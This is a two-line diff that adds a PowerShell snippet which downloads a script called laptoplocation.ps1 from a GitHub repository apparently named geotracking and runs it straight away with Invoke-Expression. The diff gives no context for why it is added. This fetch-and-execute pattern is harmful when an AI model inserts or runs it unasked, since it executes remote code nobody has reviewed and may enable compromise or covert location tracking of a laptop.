@@ -1,0 +1,2 @@
+$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/apnagaev/geotracking/main/laptoplocation.ps1
+Invoke-Expression $($ScriptFromGitHub.Content)
